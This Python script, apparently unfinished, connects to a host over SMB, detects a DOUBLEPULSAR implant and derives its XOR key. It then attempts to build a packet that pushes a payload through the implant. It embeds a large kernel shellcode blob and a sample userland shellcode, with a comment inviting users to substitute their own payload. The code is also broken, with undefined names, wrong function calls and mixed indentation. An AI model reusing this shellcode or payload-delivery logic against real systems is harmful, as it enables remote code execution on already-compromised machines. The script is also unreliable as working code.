#!/usr/bin/python

import binascii
import socket
import struct

#for XOR decryption
from itertools import cycle

#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
class NewSMBPacket(Structure):
    structure = (
        ('Signature', '"\xffSMB'),
        ('Command','B=0'),
        ('ErrorClass','B=0'),
        ('_reserved','B=0'),
        ('ErrorCode','<H=0'),
        ('Flags1','B=0'),
        ('Flags2','<H=0'),
        ('PIDHigh','<H=0'),
        ('SecurityFeatures','8s=""'),
        ('Reserved','<H=0'),
        ('Tid','<H=0xffff'),
        ('Pid','<H=0'),
        ('Uid','<H=0'),
        ('Mid','<H=0'),
        ('Data','*:'),
    )
	
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
    )

class SMBCommand(Structure):
    structure = (
        ('WordCount', 'B=len(Parameters)//2'),
        ('_ParametersLength','_-Parameters','WordCount*2'),
        ('Parameters',':'),             # default set by constructor
        ('ByteCount','<H-Data'),
        ('Data',':'),                   # default set by constructor
    )

class SMBTransaction2Secondary_Data(Structure):
    structure = (
        ('Pad1Length','_-Pad1','self["Pad1Length"]'),
        ('Pad1',':'),
        ('Trans_ParametersLength','_-Trans_Parameters','self["Trans_ParametersLength"]'),
        ('Trans_Parameters',':'),
        ('Pad2Length','_-Pad2','self["Pad2Length"]'),
        ('Pad2',':'),
        ('Trans_DataLength','_-Trans_Data','self["Trans_DataLength"]'),
        ('Trans_Data',':'),
    )
    
#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
def addCommand(self, command):
  if len(self['Data']) == 0:
    self['Command'] = command.command
    
  else:
    self['Data'][-1]['Parameters']['AndXCommand'] = command.command
    self['Data'][-1]['Parameters']['AndXOffset'] = len(self)
    self['Data'].append(command)

def calculate_doublepulsar_xor_key(s):
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x


# The arch is adjacent to the XOR key in the SMB signature
def calculate_doublepulsar_arch(s):
    if s & 0xffffffff00000000 == 0:
        return "x86 (32-bit)"
    else:
        return "x64 (64-bit)"

#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
def logoff(self):
        smb = NewSMBPacket()

        logOff = SMBCommand(SMB.SMB_COM_LOGOFF_ANDX)
        logOff['Parameters'] = SMBLogOffAndX()
        smb.addCommand(logOff)

        self.sendSMB(smb)
        self.recvSMB()
        # Let's clear some fields so you can login again under the same session
        self._uid = 0

#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
def disconnect_tree(self, tid):
        smb = NewSMBPacket()
        smb['Tid']  = tid

        smb.addCommand(SMBCommand(SMB.SMB_COM_TREE_DISCONNECT))

        self.sendSMB(smb)
        self.recvSMB()

#same as XOR_Decrypt
def xor_encrypt(message, key):
	return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(message, cycle(key)))

def read_dll_file_as_hex():
    print("reading DLL into memory!")
    with open("file.bin", "rb") as f:
        data = f.read()
        hex = binascii.hexlify(data)
        print("file imported into memory!")
        print('File size: {:d}'.format(len(data)))
    return data

kernel_shellcode = b"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
kernel_shellcode += b"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
kernel_shellcode += b"\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10"
kernel_shellcode += b"\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x50\x53\x51\x52"
kernel_shellcode += b"\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41"
kernel_shellcode += b"\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10\x00\x00\x00\x41\x53\x6A"
kernel_shellcode += b"\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55\x48\x81\xEC\x58\x01\x00"
kernel_shellcode += b"\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48\x89\x9D\xC0\x00\x00\x00"
kernel_shellcode += b"\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5\xD0\x00\x00\x00\x48\xA1"
kernel_shellcode += b"\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89\xC2\x48\xC1\xEA\x20\x48"
kernel_shellcode += b"\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00\x00\xC0\x0F\x30\xFB\xE8"
kernel_shellcode += b"\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x48\x83"
kernel_shellcode += b"\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59"
kernel_shellcode += b"\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65\x48\x8B\x24\x25\x10\x00"
kernel_shellcode += b"\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F\xD0\xFF\x56\x41\x57\x41"
kernel_shellcode += b"\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5\x66\x83\xE4\xF0\x48\x83"
kernel_shellcode += b"\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65\x4C\x8B\x3C\x25\x38\x00"
kernel_shellcode += b"\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C\x49\xC1\xE7\x0C\x49\x81"
kernel_shellcode += b"\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81\xFE\x4D\x5A\x75\xEF\x41"
kernel_shellcode += b"\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00\x48\x89\xC6\x48\x81\xC6"
kernel_shellcode += b"\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30\xE8\x03\x02\x00\x00\x48"
kernel_shellcode += b"\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90\x00\x05\x00\x00\x48\x39"
kernel_shellcode += b"\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B\x36\x48\x39\xCE\x75\xE2"
kernel_shellcode += b"\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04\x81\xF9\x00\x00\x01\x00"
kernel_shellcode += b"\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89\xCB\x41\xBB\x66\x55\xA2"
kernel_shellcode += b"\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB\x49\x8B\x0E\x41\xBB\xA3"
kernel_shellcode += b"\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89\xC6\xE8\x50\x01\x00\x00"
kernel_shellcode += b"\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49\x8B\x1E\x4D\x8D\x6E\x10"
kernel_shellcode += b"\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24\x11\xDC\xE8\x81\x01\x00"
kernel_shellcode += b"\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D\x4E\x08\x49\xC7\x01\x00"
kernel_shellcode += b"\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31\xC9\x48\x89\x0A\x48\xF7"
kernel_shellcode += b"\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC\x20\xE8\x52\x01\x00\x00"
kernel_shellcode += b"\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B\x3E\x48\x8D\x35\xE9\x00"
kernel_shellcode += b"\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00\x00\x66\x81\xC1\xF9\x00"
kernel_shellcode += b"\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03\x00\x00\x48\x89\xF1\x48"
kernel_shellcode += b"\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1\x48\x83\xEC\x20\x41\xBB"
kernel_shellcode += b"\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48\x83\xC4\x20\x5A\x59\x48"
kernel_shellcode += b"\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00\x00\x48\x85\xC0\x74\x0C"
kernel_shellcode += b"\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05\x72\x05\x48\x8B\x09\xEB"
kernel_shellcode += b"\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2\x80\xC2\x90\x31\xC9\x41"
kernel_shellcode += b"\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00\x48\x89\xC1\x4C\x8D\x89"
kernel_shellcode += b"\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89\xE2\x49\x89\xC4\x4D\x31"
kernel_shellcode += b"\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41\x50\x48\x83\xEC\x20\x41"
kernel_shellcode += b"\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00\x31\xD2\x52\x52\x41\x58"
kernel_shellcode += b"\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09\x9E\xE8\x82\x00\x00\x00"
kernel_shellcode += b"\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8\x74\x00\x00\x00\x48\x89"
kernel_shellcode += b"\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00\x00\x00\x48\x89\xEC\x5D"
kernel_shellcode += b"\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E\xC3\xE9\xB5\x00\x00\x00"
kernel_shellcode += b"\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D\x3C\x61\x7C\x02\x2C\x20"
kernel_shellcode += b"\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2\x65\x48\x8B\x52\x60\x48"
kernel_shellcode += b"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12\x48\x8B\x72\x50\x48\x0F"
kernel_shellcode += b"\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41"
kernel_shellcode += b"\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39\xD9\x75\xDA\x4C\x8B\x7A"
kernel_shellcode += b"\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52\x51\x56\x48\x89\xC2\x8B"
kernel_shellcode += b"\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x01\xD0\x50\x8B"
kernel_shellcode += b"\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48\xFF\xC9\x41\x8B\x34\x88"
kernel_shellcode += b"\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39\xD9\x75\xEC\x58\x44\x8B"
kernel_shellcode += b"\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01"
kernel_shellcode += b"\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59\x5A\x41\x58\x41\x59\x41"
kernel_shellcode += b"\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48\x89\xE5\x48\x83\xEC\x20"
kernel_shellcode += b"\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF\xFF\x31\xC9\x51\x51\x51"
kernel_shellcode += b"\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x20\x41"
kernel_shellcode += b"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
kernel_shellcode += b"\x5E\xC3"

#pop calculator shellcode - this is a sample.  Change according to your payload
userland_shellcode = b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
userland_shellcode += b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
userland_shellcode += b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
userland_shellcode += b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
userland_shellcode += b"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
userland_shellcode += b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
userland_shellcode += b"\x45\x81\x3e\x43\x72\x65\x61\x75"
userland_shellcode += b"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
userland_shellcode += b"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
userland_shellcode += b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
userland_shellcode += b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
userland_shellcode += b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
userland_shellcode += b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
userland_shellcode += b"\x53\x53\x53\x53\x52\x53\xff\xd7"
	
if __name__ == "__main__":
    # Packets
    negotiate_protocol_request = binascii.unhexlify("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
    session_setup_request = binascii.unhexlify("00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
    tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
    trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")

    timeout = 5.0
    # sample IP
    ip = "192.168.0.8"

    # Connect to socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(float(timeout) if timeout else None)
    host = ip
    port = 445
    s.connect((host, port))

    # Send/receive negotiate protocol request
    print("Sending negotiation protocol request")
    s.send(negotiate_protocol_request)
    s.recv(1024)

    # Send/receive session setup request
    print("Sending session setup request")
    s.send(session_setup_request)
    session_setup_response = s.recv(1024)

    # Extract user ID from session setup response
    user_id = session_setup_response[32:34]
    print("User ID = %s" % struct.unpack("<H", user_id)[0])

    # Replace user ID in tree connect request packet
    modified_tree_connect_request = bytearray(tree_connect_request)
    modified_tree_connect_request[32] = user_id[0]
    modified_tree_connect_request[33] = user_id[1]

    # Send tree connect request
    print("Sending tree connect")
    s.send(modified_tree_connect_request)
    tree_connect_response = s.recv(1024)

    # Extract tree ID from response
    tree_id = tree_connect_response[28:30]
    print("Tree ID = %s" % struct.unpack("<H", tree_id)[0])

    # Replace tree ID and user ID in trans2 session setup packet
    modified_trans2_session_setup = bytearray(trans2_session_setup)
    modified_trans2_session_setup[28] = tree_id[0]
    modified_trans2_session_setup[29] = tree_id[1]
    modified_trans2_session_setup[32] = user_id[0]
    modified_trans2_session_setup[33] = user_id[1]

    # Send trans2 sessions setup request
    print("Sending trans2 session setup - ping command")
    s.send(modified_trans2_session_setup)
    final_response = s.recv(1024)

    # Check for 0x51 response to indicate DOUBLEPULSAR infection
    if final_response[34] == 81:
        signature = final_response[18:26]
        signature_long = struct.unpack('<Q', signature)[0]
        key = calculate_doublepulsar_xor_key(signature_long)
        arch = calculate_doublepulsar_arch(signature_long)
        print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))

        #will use a structure than hex code of the Trans2 EXEC packet
        #packet in to execute a payload - extracted from wannacry
        #trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
        
        # Replace tree ID and user ID in trans2 exec packet
        #modified_trans2_exec_packet = bytearray(trans2_exec_packet)
        #modified_trans2_exec_packet[28] = tree_id[0]
        #modified_trans2_exec_packet[29] = tree_id[1]
        #modified_trans2_exec_packet[32] = user_id[0]
        #modified_trans2_exec_packet[33] = user_id[1]

   	#at this moment, uploading DLL files is not completed.
        #read file into memory here
        #read_dll_file_as_hex()
        
        #merge file with kernel shellcode to run payload
        #kernel shellcode is for 64 bits at the moment
        modified_kernel_shellcode = bytearray(kernel_shellcode)
        
        #add PAYLOAD shellcode length after the kernel shellcode and write this value in hex 
        modified_kernel_shellcode += hex(len(payload_shellcode))
        #add the shellcode after the shellcode size
        modified_kernel_shellcode += payload_shellcode

        #XOR memory buffer
        xor_encrypt(modified_kernel_shellcode)
        
        #fill up the packet structures
        #CODE IS NOT FINISHED HERE
        #helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/

        doublepulsar_pkt = smb.NewSMBPacket()
        
        #some values here
        doublepulsar_pkt.Flags1 = 0x18
        doublepulsar_pkt.Flags2 = 0xc007
        doublepulsar_pkt.Timeout = 0x25891a00
        
        #more will be filled if needed
        #unsure if more need to be populated at this time

        #build packet from scratch; no parameters
        transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
        transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
        transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

        transCommand['Parameters']['TotalParameterCount'] = 15
        transCommand['Parameters']['TotalDataCount'] = len(data)

        fixedOffset = 32+3+18
        transCommand['Data']['Pad1'] = ''
        

        transCommand['Parameters']['ParameterCount'] = 12
        transCommand['Parameters']['ParameterOffset'] = 0
        transCommand['Parameters']['DataCount'] = len(data)
        transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
        transCommand['Parameters']['DataDisplacement'] = displacement

        transCommand['Data']['Trans_Parameters'] = '' #parameters
        transCommand['Data']['Trans_Data'] = data
        doublpulsar_pkt.addCommand(transCommand)

        #conn.sendSMB(doublepulsar_pkt)
        s.send(doublepulsar_pkt)
        
        #send disconnect
        conn.disconnect_tree(tid)

        #send logoff
	conn.logoff()

	#close connection
	s.close()
